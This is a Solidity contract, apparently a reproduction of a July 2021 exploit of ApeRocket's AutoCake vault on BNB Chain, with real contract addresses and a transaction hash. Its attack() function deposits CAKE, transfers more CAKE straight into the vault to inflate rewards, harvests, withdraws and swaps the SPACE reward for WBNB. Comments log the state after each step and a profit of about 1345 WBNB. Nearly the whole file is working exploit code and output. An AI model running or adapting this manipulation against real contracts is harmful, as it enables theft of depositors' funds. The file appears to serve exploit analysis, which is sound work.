// SPDX-License-Identifier: AGPL-3.0-or-later
// The ABI encoder is necessary, but older Solidity versions should work
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "./interface.sol";
// Transaction hash 0x701a308fba23f9b328d2cdb6c7b245f6c3063a510e0d5bc21d2477c9084f93e0
// Timestamp 2021-07-14 04:29:27(UTC)
// Block number 9139708
// From 0x53d07afa123702469ab6cf286e9ff7033a7eff65
// To 0x3523b46a2ccd8b43b2141ab0ccc38f7b013b771c

contract ApeRocket_attack {
    address private BSwapFactoryAddress = 0x858E3312ed3A876947EA49d572A7C42DE08af7EE;
    address private WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private CAKEAddress = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address private PancakeSwapFactoryAddress = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private BUSDAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private SyrupBarAddress = 0x009cF7bC57584b7998236eff51b98A168DceA9B0;
    address private AutoCakeAddress = 0x274B5B7868c848Ac690DC9b4011e9e7e29133700;
    address private SPACEAddress = 0xe486a69E432Fdc29622bF00315f6b34C99b45e80;
    address private ApeFactoryAddress = 0x0841BD0B734E4F5853f0dD8d7Ea041c241fb0Da6;
    address private ApeRouterAddress = 0xC0788A3aD43d79aa53B09c2EaCc313A787d1d607;
    address private ApeSwapFinanceLPAddress = 0xd0F82498051067E154d1dcd3d88fA95063949D7e;

    

    address private MasterChefAddress = 0x73feaa1eE314F8c655E354234017bE2193C9E24E;


    ICAKE CAKE = ICAKE(CAKEAddress);
    IBEP20 SyrupBar = IBEP20(SyrupBarAddress);
    IBEP20 SPACE = IBEP20(SPACEAddress);
    IBEP20 WBNB = IBEP20(WBNBAddress);
    IAutoCake AutoCake =  IAutoCake(AutoCakeAddress);
    IApeRouter ApeRouter = IApeRouter(ApeRouterAddress);
    IMasterChef MasterChef = IMasterChef(MasterChefAddress);
    IApePair ApePair = IApePair(ApeSwapFinanceLPAddress);


    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    string str5 = "";
    string str6 = "";


    string str89= "";
    string str90= "";
    string str91= "";
    string str92= "";
    string str93= "";
    string str94= "";

    address[] ad = new address[](2);


    constructor() {
        CAKE.approve(AutoCakeAddress, 2 ** 256 - 1);
        SPACE.approve(ApeRouterAddress, 2 ** 256 - 1);
    }

    receive() external payable {}
    

    function attack() public {
        // ----------------------------------- Now we have enough CAKE tokens of 1615000 --------------------------------------------------
        
        // Action 1: Deposit:  CAKE --> Share



        // str1 = AutoCakeSummary();

        AutoCake.deposit(509143 * 1e18);  // x1

        // str2 = AutoCakeSummary();
        // revert(appendWithSpace(str1, str2));

        // AutoCake CakeBalance: 0 AutoCake Staked: 2545 totalShares: 2473 
        // AutoCake CakeBalance: 0 AutoCake Staked: 511688 totalShares: 497128



        // Action 2: transfer AutoCake:  CAKE -> None   State: AutoCake
        //           State: AutoCake

        // str1 = AutoCakeSummary();

        CAKE.transfer(AutoCakeAddress, 1105857 * 1e18); // x2

        // str2 = AutoCakeSummary();
        // revert(appendWithSpace(str1, str2));
        // AutoCake CakeBalance: 0 AutoCake Staked: 511688 totalShares: 497128 
        // AutoCake CakeBalance: 1105857 AutoCake Staked: 511688 totalShares: 497128



        // Action 3: None -> None
        
        // str1 = AutoCakeSummary();

        AutoCake.harvest();

        // str2 = AutoCakeSummary();
        // revert(appendWithSpace(str1, str2));

        // AutoCake CakeBalance: 1105857 AutoCake Staked: 511688 totalShares: 497128 
        // AutoCake CakeBalance: 0 AutoCake Staked: 1617545 totalShares: 497128




        // Action 4: Share --> CAKE, SPACE

        // str1 = AutoCakeSummary();
        // uint CAKEgot = CAKE.balanceOf(address(this));
        // uint SPACEgot = SPACE.balanceOf(address(this));

        AutoCake.getReward();

        // CAKEgot = (CAKE.balanceOf(address(this)) - CAKEgot ) / 1e18;
        // SPACEgot = (SPACE.balanceOf(address(this)) - SPACEgot ) / 1e18;
        // str2 = AutoCakeSummary();
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(uint2str(CAKEgot), uint2str(SPACEgot))));

        // AutoCake CakeBalance: 0 AutoCake Staked: 1617545 totalShares: 497128 
        // AutoCake CakeBalance: 0 AutoCake Staked: 517190 totalShares: 158950 
        // 770248 
        // 504978




        // Action 5: Share -> CAKE, SPACE

        // str1 = AutoCakeSummary();
        // uint CAKEgot = CAKE.balanceOf(address(this));
        // uint SPACEgot = SPACE.balanceOf(address(this));

        AutoCake.withdrawAll();
        
        // CAKEgot = (CAKE.balanceOf(address(this)) - CAKEgot ) / 1e18;
        // SPACEgot = (SPACE.balanceOf(address(this)) - SPACEgot ) / 1e18;
        // str2 = AutoCakeSummary();
        // revert(appendWithSpace(appendWithSpace(str1, str2), appendWithSpace(uint2str(CAKEgot), uint2str(SPACEgot))));
        
        // AutoCake CakeBalance: 0 AutoCake Staked: 517190 totalShares: 158950 
        // AutoCake CakeBalance: 0 AutoCake Staked: 8047 totalShares: 2473 
        // 506597 
        // 3834





        // Action 6: Swap Space for WBNB:  Space -> WBNB     State: ApeRouter
        //           State: ApeRouter

        // str1 = ApePairSummary();
        // uint WBNBgot = WBNB.balanceOf(address(this));

        ad[0] = SPACEAddress;
        ad[1] = WBNBAddress;
        ApeRouter.swapExactTokensForTokens(503997 * 1e18, 1, ad, address(this), 16263233670);
        
        // WBNBgot = (WBNB.balanceOf(address(this)) - WBNBgot ) / 1e18;
        // str2 = ApePairSummary();
        // revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(WBNBgot)));

        // ApePair WBNB reserve: 22196 ApePair Space reserve: 159306 
        // ApePair WBNB reserve: 5339 ApePair Space reserve: 663303 
        // 16857





        

        revert(ProfitSummary());

        // WBNB Balance: 16857 CAKE Balance: 1276845
        // Profit:  16857 + (1276845 - 1615000) * 4.587 * 10^(-2) 
        //        = 1345.83015 WBNB




    }

    
    function AutoCakeSummaryUserInfo() internal returns (string memory _uintAsString)  {
        uint AutoCakeCakeBalance = CAKE.balanceOf(AutoCakeAddress) / 1e18;
        (uint AutoCakeStaked, ) = MasterChef.userInfo(0, address(AutoCake)) ;
        AutoCakeStaked = AutoCakeStaked / 1e18;
        uint totalShares = AutoCake.totalShares() / 1e18;
        uint shares = AutoCake.sharesOf(address(this)) / 1e18;
        uint principle = AutoCake.principalOf(address(this)) / 1e18;
        str89 = append("AutoCake CakeBalance: ", uint2str(AutoCakeCakeBalance));
        str90 = append("AutoCake Staked: ", uint2str(AutoCakeStaked));
        str91 = append("totalShares: ", uint2str(totalShares));
        str92 = append("user shares: ", uint2str(shares));
        str93 = append("user principle: ", uint2str(principle));
        return appendWithSpace(str89, appendWithSpace(str90, appendWithSpace(str91, appendWithSpace(str92, str93))));
    }



    function AutoCakeSummary() internal returns (string memory _uintAsString)  {
        uint AutoCakeCakeBalance = CAKE.balanceOf(AutoCakeAddress) / 1e18;
        (uint AutoCakeStaked, ) = MasterChef.userInfo(0, address(AutoCake)) ;
        AutoCakeStaked = AutoCakeStaked / 1e18;
        uint totalShares = AutoCake.totalShares() / 1e18;
        str89 = append("AutoCake CakeBalance: ", uint2str(AutoCakeCakeBalance));
        str90 = append("AutoCake Staked: ", uint2str(AutoCakeStaked));
        str91 = append("totalShares: ", uint2str(totalShares));
        return appendWithSpace(appendWithSpace(str89, str90), str91);
    }

    function ApePairSummary() internal returns (string memory) {
        (uint112 _reserve0, uint112 _reserve1,) = ApePair.getReserves();
        str89 = append("ApePair WBNB reserve: ", uint2str(_reserve0 / 1e18));
        str90 = append("ApePair Space reserve: ", uint2str(_reserve1 / 1e18));
        return appendWithSpace(str89, str90);
    }



    function principleSummary() internal returns (string memory _uintAsString)  {
        uint principle = AutoCake.principalOf(address(this)) / 1e18 ;
        str91 = append("principle: ", uint2str(principle));
        return str91;
    }



    function ProfitSummary() internal returns (string memory _uintAsString)  {
        uint WBNBBalance = WBNB.balanceOf(address(this)) / 1e18;
        uint CAKEBalance =  CAKE.balanceOf(address(this)) / 1e18;
        str1 = append("WBNB Balance: ", uint2str(WBNBBalance));
        str2 = append("CAKE Balance: ", uint2str(CAKEBalance));
        return appendWithSpace(str1, str2);
    }


    function uint2str(uint _i) internal returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


    function toString(address account) internal pure returns(string memory) {
        return toString(abi.encodePacked(account));
    }

    function toString(bytes memory data) internal pure returns(string memory) {
        bytes memory alphabet = "0123456789abcdef";
        bytes memory str = new bytes(2 + data.length * 2);
        str[0] = "0";
        str[1] = "x";
        for (uint i = 0; i < data.length; i++) {
            str[2+i*2] = alphabet[uint(uint8(data[i] >> 4))];
            str[3+i*2] = alphabet[uint(uint8(data[i] & 0x0f))];
        }
        return string(str);
    }
}